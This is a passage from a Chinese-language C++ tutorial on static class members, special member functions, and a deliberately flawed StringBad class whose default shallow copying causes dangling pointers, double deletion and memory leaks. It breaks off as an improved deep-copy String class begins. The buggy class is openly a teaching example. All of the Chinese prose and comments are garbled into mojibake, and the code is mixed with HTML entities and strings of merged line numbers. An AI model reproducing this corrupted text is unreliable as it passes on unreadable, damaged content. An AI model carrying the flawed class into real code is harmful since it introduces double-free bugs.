çš„ç±»ç›´æ¥ä½¿ç”¨æŒ‡é’ˆæ¥ç®¡ç†é€šè¿‡ new åˆ†é…çš„å†…å­˜ï¼ˆä¾‹å¦‚ï¼Œè‡ªå®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²ç±»æ¥ç®¡ç† char* æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ï¼‰ï¼Œé‚£ä¹ˆ C++ ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„æŸäº›é»˜è®¤è¡Œä¸ºï¼ˆç‰¹åˆ«æ˜¯å¯¹è±¡å¤åˆ¶å’Œèµ‹å€¼ï¼‰å¯èƒ½ä¼šå¯¼è‡´ä¸¥é‡çš„é—®é¢˜ï¼Œå¦‚å†…å­˜æ³„æ¼å’Œç¨‹åºå´©æºƒã€‚æœ¬ç« å°†æ¢è®¨è¿™äº›é—®é¢˜ä»¥åŠå¦‚ä½•é€šè¿‡å®šä¹‰ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°æ¥è§£å†³å®ƒä»¬ã€‚ 12.1.1 å¤ä¹ ç¤ºä¾‹å’Œé™æ€ç±»æˆå‘˜è®©æˆ‘ä»¬ä»ä¸€ä¸ªç®€å•çš„ã€æ•…æ„è®¾è®¡å¾—æœ‰é—®é¢˜çš„å­—ç¬¦ä¸²ç±» StringBad å¼€å§‹ï¼Œå®ƒä½¿ç”¨ char* æŒ‡é’ˆæ¥æŒ‡å‘åŠ¨æ€åˆ†é…çš„å†…å­˜ã€‚ StringBad ç±»å®šä¹‰ (stringbad.h) 12345678910111213141516171819202122#ifndef STRINGBAD_H_#define STRINGBAD_H_#include &lt;iostream&gt;class StringBad &#123;private: char * str; // æŒ‡å‘å­—ç¬¦ä¸²çš„æŒ‡é’ˆ int len; // å­—ç¬¦ä¸²é•¿åº¦ // é™æ€æ•°æ®æˆå‘˜: ç”¨äºè·Ÿè¸ªå¯¹è±¡æ•°é‡ static int num_strings;public: // æ„é€ å‡½æ•° StringBad(const char * s); // ä» C å­—ç¬¦ä¸²æ„é€  StringBad(); // é»˜è®¤æ„é€ å‡½æ•° // ææ„å‡½æ•° ~StringBad(); // éå¸¸é‡è¦ï¼ // å‹å…ƒå‡½æ•°: é‡è½½ &lt;&lt; friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const StringBad &amp; st);&#125;;#endif // STRINGBAD_H_ StringBad ç±»å®ç° (stringbad.cpp) 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;cstring&gt; // ä¸ºäº†ä½¿ç”¨ strlen, strcpy#include &quot;stringbad.h&quot;// åˆå§‹åŒ–é™æ€ç±»æˆå‘˜ num_strings// æ³¨æ„ï¼šé™æ€æ•°æ®æˆå‘˜å¿…é¡»åœ¨ç±»å®šä¹‰å¤–éƒ¨è¿›è¡Œå®šä¹‰å’Œåˆå§‹åŒ–int StringBad::num_strings = 0; // åˆå§‹åŒ–ä¸º 0// æ„é€ å‡½æ•°: ä» C å­—ç¬¦ä¸²æ„é€ StringBad::StringBad(const char * s) &#123; len = std::strlen(s); // è·å–é•¿åº¦ str = new char[len + 1]; // åˆ†é…å†…å­˜ (+1 ä¸ºäº†å­˜å‚¨æœ«å°¾çš„ &#x27;\\0&#x27;) std::strcpy(str, s); // å¤åˆ¶å­—ç¬¦ä¸²åˆ°æ–°å†…å­˜ num_strings++; // å¯¹è±¡è®¡æ•°å¢åŠ  std::cout &lt;&lt; num_strings &lt;&lt; &quot;: \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot; object created\\n&quot;; // è°ƒè¯•ä¿¡æ¯&#125;// é»˜è®¤æ„é€ å‡½æ•°StringBad::StringBad() &#123; len = 4; str = new char[4]; std::strcpy(str, &quot;C++&quot;); // é»˜è®¤å€¼ num_strings++; std::cout &lt;&lt; num_strings &lt;&lt; &quot;: \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot; default object created\\n&quot;; // è°ƒè¯•ä¿¡æ¯&#125;// ææ„å‡½æ•°StringBad::~StringBad() &#123; std::cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot; object deleted, &quot;; // è°ƒè¯•ä¿¡æ¯ --num_strings; // å¯¹è±¡è®¡æ•°å‡å°‘ std::cout &lt;&lt; num_strings &lt;&lt; &quot; left\\n&quot;; // è°ƒè¯•ä¿¡æ¯ delete [] str; // é‡Šæ”¾å†…å­˜ï¼&#125;// å‹å…ƒå‡½æ•°: é‡è½½ &lt;&lt;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const StringBad &amp; st) &#123; os &lt;&lt; st.str; return os;&#125; è¿™ä¸ªç±»çœ‹èµ·æ¥ä¼¼ä¹èƒ½å·¥ä½œï¼šå®ƒåœ¨æ„é€ æ—¶åˆ†é…å†…å­˜ï¼Œåœ¨ææ„æ—¶é‡Šæ”¾å†…å­˜ã€‚ä½†æ˜¯ï¼Œå®ƒç¼ºå°‘ä¸€äº›å…³é”®çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬ç¨åä¼šçœ‹åˆ°ã€‚ é™æ€ç±»æˆå‘˜ (Static Class Members) åœ¨ StringBad ä¸­ï¼Œæˆ‘ä»¬å¼•å…¥äº†ä¸€ä¸ª static int num_strings;ã€‚è¿™æ˜¯ä¸€ä¸ªé™æ€æ•°æ®æˆå‘˜ã€‚ å…±äº«æ€§: é™æ€æ•°æ®æˆå‘˜ä¸å±äºä»»ä½•å•ä¸ªå¯¹è±¡ï¼Œè€Œæ˜¯è¢«ç±»çš„æ‰€æœ‰å¯¹è±¡å…±äº«ã€‚æ— è®ºåˆ›å»ºå¤šå°‘ä¸ª StringBad å¯¹è±¡ï¼Œnum_strings åªæœ‰ä¸€ä¸ªå‰¯æœ¬ã€‚ ç”Ÿå‘½å‘¨æœŸ: é™æ€æ•°æ®æˆå‘˜åœ¨ç¨‹åºå¯åŠ¨æ—¶åˆ›å»ºï¼Œåœ¨ç¨‹åºç»“æŸæ—¶é”€æ¯ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸä¸ç¨‹åºçš„è¿è¡Œæ—¶é—´ç›¸åŒï¼Œå³ä½¿æ²¡æœ‰åˆ›å»ºä»»ä½•ç±»å¯¹è±¡ï¼Œå®ƒä¹Ÿå­˜åœ¨ã€‚ åˆå§‹åŒ–: é™æ€æ•°æ®æˆå‘˜å¿…é¡»åœ¨ç±»å®šä¹‰ä¹‹å¤–è¿›è¡Œåˆå§‹åŒ–ï¼ˆé€šå¸¸åœ¨å¯¹åº”çš„ .cpp æ–‡ä»¶ä¸­ï¼‰ï¼Œå¦‚ int StringBad::num_strings = 0;ã€‚åˆå§‹åŒ–æ—¶éœ€è¦ä½¿ç”¨ç±»åå’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ ::ï¼Œå¹¶ä¸”ä¸å†éœ€è¦ static å…³é”®å­—ã€‚ ä¾‹å¤–ï¼šconst çš„æ•´å‹æˆ–æšä¸¾ç±»å‹çš„é™æ€æˆå‘˜ï¼ˆä»¥åŠ C++11 ä¸­çš„ constexpr é™æ€æˆå‘˜ï¼‰å¯ä»¥åœ¨ç±»å®šä¹‰å†…éƒ¨åˆå§‹åŒ–ã€‚ ç”¨é€”: å¸¸ç”¨äºè·Ÿè¸ªç±»çš„å®ä¾‹æ•°é‡ã€å…±äº«ç±»èŒƒå›´å†…çš„å¸¸é‡æˆ–æ ‡å¿—ç­‰ã€‚ é™¤äº†é™æ€æ•°æ®æˆå‘˜ï¼Œè¿˜æœ‰**é™æ€æˆå‘˜å‡½æ•° (Static Member Functions)**ã€‚ å£°æ˜: åœ¨å‡½æ•°å£°æ˜å‰åŠ ä¸Š static å…³é”®å­—ã€‚ æ—  this æŒ‡é’ˆ: é™æ€æˆå‘˜å‡½æ•°ä¸ä¸ä»»ä½•ç‰¹å®šå¯¹è±¡å…³è”ï¼Œå› æ­¤å®ƒä»¬æ²¡æœ‰ this æŒ‡é’ˆã€‚ è®¿é—®é™åˆ¶: å®ƒä»¬åªèƒ½ç›´æ¥è®¿é—®ç±»çš„é™æ€æ•°æ®æˆå‘˜æˆ–å…¶ä»–é™æ€æˆå‘˜å‡½æ•°ã€‚å®ƒä»¬ä¸èƒ½ç›´æ¥è®¿é—®éé™æ€æˆå‘˜ï¼ˆæ•°æ®æˆ–å‡½æ•°ï¼‰ï¼Œå› ä¸ºéé™æ€æˆå‘˜éœ€è¦é€šè¿‡å¯¹è±¡ï¼ˆthis æŒ‡é’ˆï¼‰æ¥è®¿é—®ã€‚ è°ƒç”¨: å¯ä»¥é€šè¿‡ç±»åå’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦è°ƒç”¨ï¼ˆClassName::static_func()ï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç±»çš„å¯¹è±¡è°ƒç”¨ï¼ˆobject.static_func()ï¼‰ï¼Œä½†æ¨èä½¿ç”¨å‰è€…ï¼Œå› ä¸ºå®ƒæ›´æ¸…æ™°åœ°è¡¨æ˜äº†å‡½æ•°çš„é™æ€å±æ€§ã€‚ 123456789101112131415161718192021222324252627282930// ç¤ºä¾‹ï¼šæ·»åŠ ä¸€ä¸ªé™æ€æˆå‘˜å‡½æ•°åˆ° StringBad// stringbad.hclass StringBad &#123; // ... existing private members ... static int num_strings;public: // ... existing public members ... // é™æ€æˆå‘˜å‡½æ•° static int HowMany();&#125;;// stringbad.cpp// ... existing code ...// å®šä¹‰é™æ€æˆå‘˜å‡½æ•°int StringBad::HowMany() &#123; return num_strings; // å¯ä»¥è®¿é—®é™æ€æˆå‘˜ num_strings // return len; // é”™è¯¯ï¼ä¸èƒ½ç›´æ¥è®¿é—®éé™æ€æˆå‘˜ len&#125;// main.cpp#include &quot;stringbad.h&quot;#include &lt;iostream&gt;int main() &#123; StringBad s1(&quot;Hello&quot;); StringBad s2(&quot;World&quot;); std::cout &lt;&lt; &quot;Number of objects: &quot; &lt;&lt; StringBad::HowMany() &lt;&lt; std::endl; // é€šè¿‡ç±»åè°ƒç”¨ std::cout &lt;&lt; &quot;Number of objects: &quot; &lt;&lt; s1.HowMany() &lt;&lt; std::endl; // é€šè¿‡å¯¹è±¡è°ƒç”¨ (ä¸æ¨è) return 0;&#125; 12.1.2 ç‰¹æ®Šæˆå‘˜å‡½æ•°C++ ç±»æœ‰ä¸€äº›ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼Œå¦‚æœç¨‹åºå‘˜æ²¡æœ‰æ˜¾å¼å®šä¹‰å®ƒä»¬ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šè‡ªåŠ¨ç”Ÿæˆé»˜è®¤ç‰ˆæœ¬ã€‚è¿™äº›å‡½æ•°å¯¹äºæ§åˆ¶å¯¹è±¡çš„åˆ›å»ºã€é”€æ¯ã€å¤åˆ¶å’Œç§»åŠ¨è‡³å…³é‡è¦ï¼š é»˜è®¤æ„é€ å‡½æ•° (Default Constructor): å¦‚æœä½ æ²¡æœ‰å®šä¹‰ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚å®ƒé€šå¸¸ä»€ä¹ˆä¹Ÿä¸åšï¼ˆå¯¹äºå†…ç½®ç±»å‹æˆå‘˜ï¼‰æˆ–è°ƒç”¨æˆå‘˜å¯¹è±¡çš„é»˜è®¤æ„é€ å‡½æ•°ã€‚ ææ„å‡½æ•° (Destructor): å¦‚æœä½ æ²¡æœ‰å®šä¹‰ææ„å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚å®ƒé€šå¸¸ä»€ä¹ˆä¹Ÿä¸åšæˆ–è°ƒç”¨æˆå‘˜å¯¹è±¡çš„ææ„å‡½æ•°ã€‚å¯¹äºéœ€è¦é‡Šæ”¾èµ„æºçš„ç±»ï¼ˆå¦‚ StringBadï¼‰ï¼Œå¿…é¡»å®šä¹‰è‡ªå·±çš„ææ„å‡½æ•°ã€‚ å¤åˆ¶æ„é€ å‡½æ•° (Copy Constructor): å¦‚æœä½ æ²¡æœ‰å®šä¹‰ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚å®ƒçš„å‚æ•°é€šå¸¸æ˜¯åŒç±»å¯¹è±¡çš„ const å¼•ç”¨ï¼ˆä¾‹å¦‚ StringBad(const StringBad&amp;)ï¼‰ã€‚é»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°æ‰§è¡Œæˆå‘˜é€ä¸€å¤åˆ¶ (memberwise copy) æˆ–ç§°**æµ…å¤åˆ¶ (shallow copy)**ã€‚ å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (Copy Assignment Operator): å¦‚æœä½ æ²¡æœ‰å®šä¹‰ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚å®ƒçš„å‚æ•°é€šå¸¸æ˜¯åŒç±»å¯¹è±¡çš„ const å¼•ç”¨ï¼Œå¹¶è¿”å›ä¸€ä¸ªæŒ‡å‘è°ƒç”¨å¯¹è±¡çš„å¼•ç”¨ï¼ˆä¾‹å¦‚ StringBad&amp; operator=(const StringBad&amp;)ï¼‰ã€‚é»˜è®¤çš„èµ‹å€¼è¿ç®—ç¬¦ä¹Ÿæ‰§è¡Œ**æˆå‘˜é€ä¸€å¤åˆ¶ (æµ…å¤åˆ¶)**ã€‚ ç§»åŠ¨æ„é€ å‡½æ•° (Move Constructor) (C++11): å¦‚æœä½ æ²¡æœ‰å®šä¹‰ä»»ä½•å¤åˆ¶/ç§»åŠ¨æ“ä½œæˆ–ææ„å‡½æ•°ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šç”Ÿæˆä¸€ä¸ªã€‚å‚æ•°æ˜¯åŒç±»å¯¹è±¡çš„å³å€¼å¼•ç”¨ï¼ˆStringBad(StringBad&amp;&amp;)ï¼‰ã€‚é»˜è®¤æ‰§è¡Œæˆå‘˜é€ä¸€ç§»åŠ¨ã€‚ ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ (Move Assignment Operator) (C++11): å¦‚æœä½ æ²¡æœ‰å®šä¹‰ä»»ä½•å¤åˆ¶/ç§»åŠ¨æ“ä½œæˆ–ææ„å‡½æ•°ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šç”Ÿæˆä¸€ä¸ªã€‚å‚æ•°æ˜¯åŒç±»å¯¹è±¡çš„å³å€¼å¼•ç”¨ï¼Œè¿”å›å¯¹è±¡å¼•ç”¨ï¼ˆStringBad&amp; operator=(StringBad&amp;&amp;)ï¼‰ã€‚é»˜è®¤æ‰§è¡Œæˆå‘˜é€ä¸€ç§»åŠ¨ã€‚ å…³é”®é—®é¢˜ï¼šæˆå‘˜é€ä¸€å¤åˆ¶ (æµ…å¤åˆ¶) å¯¹äºåƒ int æˆ– double è¿™æ ·çš„ç®€å•æ•°æ®æˆå‘˜ï¼Œæˆå‘˜é€ä¸€å¤åˆ¶å·¥ä½œå¾—å¾ˆå¥½ã€‚ä½†æ˜¯ï¼Œå¯¹äºæŒ‡é’ˆæˆå‘˜ï¼ˆå¦‚ StringBad ä¸­çš„ char * strï¼‰ï¼Œæˆå‘˜é€ä¸€å¤åˆ¶ä»…ä»…æ˜¯å¤åˆ¶æŒ‡é’ˆçš„å€¼ï¼ˆåœ°å€ï¼‰ï¼Œè€Œä¸æ˜¯æŒ‡é’ˆæ‰€æŒ‡å‘çš„æ•°æ®ã€‚è¿™å°±æ˜¯æ‰€è°“çš„æµ…å¤åˆ¶ã€‚ 12.1.3 å›åˆ° StringBadï¼šå¤åˆ¶æ„é€ å‡½æ•°çš„å“ªé‡Œå‡ºäº†é—®é¢˜è€ƒè™‘ä»¥ä¸‹ä»£ç ï¼Œå®ƒä¼šéšå¼åœ°è°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940// main_problem.cpp#include &lt;iostream&gt;#include &quot;stringbad.h&quot; // å‡è®¾ stringbad.h/cpp å¦‚ä¸Šå®šä¹‰ (æ²¡æœ‰è‡ªå®šä¹‰å¤åˆ¶æ„é€ å‡½æ•°)void callme1(StringBad sb) &#123; // æŒ‰å€¼ä¼ é€’ï¼Œè°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•° std::cout &lt;&lt; &quot;String passed by value:\\n&quot;; std::cout &lt;&lt; &quot; \\&quot;&quot; &lt;&lt; sb &lt;&lt; &quot;\\&quot;\\n&quot;;&#125;int main() &#123; using std::cout; using std::endl; &#123; cout &lt;&lt; &quot;Starting an inner block.\\n&quot;; StringBad headline1(&quot;Celery Stalks at Midnight&quot;); StringBad headline2(&quot;Lettuce Prey&quot;); StringBad sports(&quot;Spinach Leaves Bowl for Dollars&quot;); cout &lt;&lt; &quot;headline1: &quot; &lt;&lt; headline1 &lt;&lt; endl; cout &lt;&lt; &quot;headline2: &quot; &lt;&lt; headline2 &lt;&lt; endl; cout &lt;&lt; &quot;sports: &quot; &lt;&lt; sports &lt;&lt; endl; callme1(headline1); // è°ƒç”¨ callme1ï¼Œheadline1 è¢«å¤åˆ¶åˆ°å‚æ•° sb cout &lt;&lt; &quot;headline1: &quot; &lt;&lt; headline1 &lt;&lt; endl; // å†æ¬¡æ‰“å° headline1 cout &lt;&lt; &quot;Initialize one object to another:\\n&quot;; StringBad sailor = sports; // è°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•° cout &lt;&lt; &quot;sailor: &quot; &lt;&lt; sailor &lt;&lt; endl; cout &lt;&lt; &quot;Assign one object to another:\\n&quot;; StringBad knot; // è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•° knot = headline1; // è°ƒç”¨èµ‹å€¼è¿ç®—ç¬¦ (è¿™é‡Œæ˜¯é»˜è®¤çš„) cout &lt;&lt; &quot;knot: &quot; &lt;&lt; knot &lt;&lt; endl; cout &lt;&lt; &quot;Exiting the inner block.\\n&quot;; &#125; // ä½œç”¨åŸŸç»“æŸï¼Œheadline1, headline2, sports, sailor, knot çš„ææ„å‡½æ•°è¢«è°ƒç”¨ cout &lt;&lt; &quot;End of main()\\n&quot;; return 0;&#125; å½“ä½ è¿è¡Œè¿™æ®µä»£ç æ—¶ï¼ˆå‡è®¾ç¼–è¯‘å™¨ç”Ÿæˆäº†é»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ï¼‰ï¼Œä½ ä¼šé‡åˆ°ä¸¥é‡çš„é—®é¢˜ï¼Œå¾ˆå¯èƒ½ç¨‹åºä¼šå´©æºƒã€‚åŸå› å¦‚ä¸‹ï¼š callme1(headline1): å½“ headline1 æŒ‰å€¼ä¼ é€’ç»™ callme1 æ—¶ï¼Œä¼šè°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•°æ¥åˆ›å»ºå‚æ•° sbã€‚é»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°æ‰§è¡Œæµ…å¤åˆ¶ï¼šsb.str è¢«è®¾ç½®ä¸ºä¸ headline1.str ç›¸åŒçš„å†…å­˜åœ°å€ã€‚ callme1 ç»“æŸ: å½“ callme1 å‡½æ•°è¿”å›æ—¶ï¼Œå…¶å±€éƒ¨å˜é‡ sb è¢«é”€æ¯ï¼Œè°ƒç”¨ sb çš„ææ„å‡½æ•° ~StringBad()ã€‚è¿™ä¸ªææ„å‡½æ•°æ‰§è¡Œ delete [] sb.str;ï¼Œé‡Šæ”¾äº† headline1.str æŒ‡å‘çš„å†…å­˜ï¼ headline1 çš„åç»­ä½¿ç”¨: å›åˆ° main å‡½æ•°åï¼Œheadline1.str ç°åœ¨æ˜¯ä¸€ä¸ªæ‚¬æŒ‚æŒ‡é’ˆ (dangling pointer)**ï¼Œå®ƒæŒ‡å‘å·²ç»è¢«é‡Šæ”¾çš„å†…å­˜ã€‚ä»»ä½•è¯•å›¾è®¿é—® headline1 å†…å®¹çš„æ“ä½œï¼ˆå¦‚ cout &lt;&lt; headline1 æˆ– knot = headline1ï¼‰éƒ½å°†å¯¼è‡´æœªå®šä¹‰è¡Œä¸º**ï¼ˆé€šå¸¸æ˜¯å´©æºƒï¼‰ã€‚ StringBad sailor = sports;: åŒæ ·ï¼Œé»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°ä½¿ sailor.str å’Œ sports.str æŒ‡å‘åŒä¸€å—å†…å­˜ã€‚ ä½œç”¨åŸŸç»“æŸ: å½“ main å‡½æ•°çš„å†…éƒ¨ä½œç”¨åŸŸ &#123;&#125; ç»“æŸæ—¶ï¼Œæ‰€æœ‰å±€éƒ¨å¯¹è±¡ï¼ˆheadline1, headline2, sports, sailor, knotï¼‰çš„ææ„å‡½æ•°è¢«è°ƒç”¨ã€‚ ~StringBad() for knot å¯èƒ½å°è¯•åˆ é™¤å·²ç»è¢« callme1 ä¸­ sb çš„ææ„å‡½æ•°åˆ é™¤çš„å†…å­˜ï¼ˆå¦‚æœ knot = headline1 å‘ç”Ÿåœ¨ callme1 ä¹‹åï¼‰ã€‚ ~StringBad() for sailor ä¼šåˆ é™¤ sports.str æŒ‡å‘çš„å†…å­˜ã€‚ ~StringBad() for sports ä¼šå†æ¬¡å°è¯•åˆ é™¤åŒä¸€å—å†…å­˜ã€‚ ~StringBad() for headline2 æ­£å¸¸å·¥ä½œã€‚ ~StringBad() for headline1 å°è¯•åˆ é™¤å·²ç»è¢« callme1 ä¸­ sb çš„ææ„å‡½æ•°åˆ é™¤çš„å†…å­˜ã€‚ è¿™ç§é‡å¤åˆ é™¤ (double deletion) åŒä¸€å—å†…å­˜çš„è¡Œä¸ºæ˜¯å¯¼è‡´ç¨‹åºå´©æºƒçš„å¸¸è§åŸå› ã€‚ 12.1.4 StringBad çš„å…¶ä»–é—®é¢˜ï¼šèµ‹å€¼è¿ç®—ç¬¦é»˜è®¤çš„èµ‹å€¼è¿ç®—ç¬¦ operator= åŒæ ·æ‰§è¡Œæµ…å¤åˆ¶ï¼Œä¹Ÿä¼šå¯¼è‡´é—®é¢˜ï¼š 1234StringBad knot; // knot.str æŒ‡å‘ &quot;C++&quot; çš„å†…å­˜StringBad headline1(&quot;Celery Stalks at Midnight&quot;); // headline1.str æŒ‡å‘ &quot;Celery...&quot; çš„å†…å­˜knot = headline1; // è°ƒç”¨é»˜è®¤èµ‹å€¼è¿ç®—ç¬¦ æ‰§è¡Œ knot = headline1; åï¼š knot.len è¢«è®¾ç½®ä¸º headline1.lenã€‚ knot.str è¢«è®¾ç½®ä¸º headline1.str çš„å€¼ï¼ˆå†…å­˜åœ°å€ï¼‰ã€‚ ç»“æœï¼š knot.str å’Œ headline1.str æŒ‡å‘åŒä¸€å—å†…å­˜ (â€œCeleryâ€¦â€)ã€‚ knot åŸæ¥æŒ‡å‘çš„å†…å­˜ (â€œC++â€) çš„åœ°å€ä¸¢å¤±äº†ï¼Œè¿™å—å†…å­˜æ²¡æœ‰è¢« deleteï¼Œé€ æˆäº†**å†…å­˜æ³„æ¼ (memory leak)**ã€‚ å½“ knot å’Œ headline1 çš„ææ„å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œä¼šå‘ç”Ÿé‡å¤åˆ é™¤ã€‚ ç»“è®º: å¯¹äºç®¡ç†åŠ¨æ€å†…å­˜çš„ç±»ï¼ˆå³ç±»å†…éƒ¨æœ‰æŒ‡é’ˆæˆå‘˜ï¼Œå¹¶ä¸”ç±»è´Ÿè´£ new å’Œ delete è¿™äº›æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ï¼‰ï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°å’Œé»˜è®¤èµ‹å€¼è¿ç®—ç¬¦æ˜¯ä¸å®‰å…¨çš„ï¼Œä¼šå¯¼è‡´æµ…å¤åˆ¶ã€å†…å­˜æ³„æ¼å’Œé‡å¤åˆ é™¤ç­‰é—®é¢˜ã€‚ ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºè¿™æ ·çš„ç±»æä¾›æˆ‘ä»¬è‡ªå·±çš„ã€æ­£ç¡®å®ç°çš„ï¼š ææ„å‡½æ•°: ç¡®ä¿é‡Šæ”¾æ‰€æœ‰é€šè¿‡ new åˆ†é…çš„èµ„æºã€‚ å¤åˆ¶æ„é€ å‡½æ•°: æ‰§è¡Œ**æ·±å¤åˆ¶ (deep copy)**ï¼Œå³ä¸ºæ–°å¯¹è±¡åˆ†é…è‡ªå·±çš„å†…å­˜ï¼Œå¹¶å°†åŸå§‹å¯¹è±¡çš„æ•°æ®å¤åˆ¶åˆ°æ–°å†…å­˜ä¸­ã€‚ å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦: æ‰§è¡Œæ·±å¤åˆ¶ï¼Œå¹¶æ­£ç¡®å¤„ç†è‡ªæˆ‘èµ‹å€¼ï¼ˆobj = obj;ï¼‰å’Œé‡Šæ”¾æ—§èµ„æºã€‚ è¿™é€šå¸¸è¢«ç§°ä¸ºå¤åˆ¶æ§åˆ¶ (Copy Control) æˆ–éµå¾ª**ä¸‰/äº”/é›¶æ³•åˆ™ (Rule of Three/Five/Zero)**ã€‚å¦‚æœä¸€ä¸ªç±»éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°æˆ–å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œé‚£ä¹ˆå®ƒå¾ˆå¯èƒ½éœ€è¦è‡ªå®šä¹‰æ‰€æœ‰è¿™ä¸‰ä¸ªï¼ˆC++11 å‰çš„ä¸‰æ³•åˆ™ï¼‰ã€‚åœ¨ C++11 ä¸­ï¼Œå¦‚æœéœ€è¦è‡ªå®šä¹‰è¿™ä¸‰ä¸ªä¸­çš„ä»»ä½•ä¸€ä¸ªæˆ–ç§»åŠ¨æ„é€ å‡½æ•°/ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ï¼Œåˆ™å¯èƒ½éœ€è¦è€ƒè™‘æ‰€æœ‰äº”ä¸ªï¼ˆäº”æ³•åˆ™ï¼‰ã€‚æˆ–è€…ï¼Œé€šè¿‡ä½¿ç”¨ RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰åŸåˆ™å’Œæ™ºèƒ½æŒ‡é’ˆç­‰ç°ä»£ C++ æŠ€æœ¯ï¼Œå¯èƒ½å¯ä»¥é¿å…æ‰‹åŠ¨ç®¡ç†å†…å­˜ï¼Œä»è€Œä¸éœ€è¦è‡ªå®šä¹‰è¿™äº›ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼ˆé›¶æ³•åˆ™ï¼‰ã€‚ 12.2 æ”¹è¿›åçš„æ–° String ç±»ä¸Šä¸€èŠ‚æˆ‘ä»¬çœ‹åˆ°äº† StringBad ç±»çš„é—®é¢˜ï¼šç”±äºå®ƒç®¡ç†åŠ¨æ€å†…å­˜ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦æ‰§è¡Œçš„æµ…å¤åˆ¶ï¼ˆåªå¤åˆ¶æŒ‡é’ˆåœ°å€ï¼‰å¯¼è‡´äº†å†…å­˜æ³„æ¼å’Œé‡å¤åˆ é™¤ç­‰ä¸¥é‡é”™è¯¯ã€‚ ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦éµå¾ªå¤åˆ¶æ§åˆ¶åŸåˆ™ï¼ˆæˆ–ç§°ä¸‰/äº”æ³•åˆ™ï¼‰ï¼Œä¸ºç®¡ç†åŠ¨æ€å†…å­˜çš„ç±»æä¾›è‡ªå®šä¹‰çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ã€‚æœ¬èŠ‚æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ”¹è¿›çš„ String ç±»ï¼ˆæ”¾åœ¨ string1.h å’Œ string1.cpp ä¸­ï¼‰ï¼Œå®ƒèƒ½æ­£ç¡®å¤„ç†åŠ¨æ€å†…å­˜ã€‚ æ ¸å¿ƒæ”¹è¿›ï¼šæ·±å¤åˆ¶ (Deep Copy) å…³é”®åœ¨äºå®ç°æ·±å¤åˆ¶ï¼Œè€Œä¸æ˜¯æµ…å¤åˆ¶ã€‚æ·±å¤åˆ¶æ„å‘³ç€å½“å¤åˆ¶å¯¹è±¡æ—¶ï¼Œä¸ä»…å¤åˆ¶æ™®é€šæˆå‘˜çš„å€¼ï¼Œè¿˜è¦ä¸ºæŒ‡é’ˆæˆå‘˜æŒ‡å‘çš„æ•°æ®åˆ†é…æ–°çš„å†…å­˜ï¼Œå¹¶å°†åŸå§‹æ•°æ®å¤åˆ¶åˆ°è¿™å—æ–°å†…å­˜ä¸­ã€‚ 1. å¤åˆ¶æ„é€ å‡½æ•° (Copy Constructor) å½“ä¸€ä¸ªå¯¹è±¡éœ€è¦é€šè¿‡åŒç±»å‹çš„å¦ä¸€ä¸ªå¯¹è±¡æ¥åˆå§‹åŒ–æ—¶ï¼ˆä¾‹å¦‚ String s2 = s1; æˆ–æŒ‰å€¼ä¼ é€’å‚æ•°ï¼‰ï¼Œå¤åˆ¶æ„é€ å‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚æˆ‘ä»¬çš„è‡ªå®šä¹‰ç‰ˆæœ¬å¿…é¡»æ‰§è¡Œæ·±å¤åˆ¶ï¼š 123456789// string1.cpp excerpt// Copy Constructor (Deep 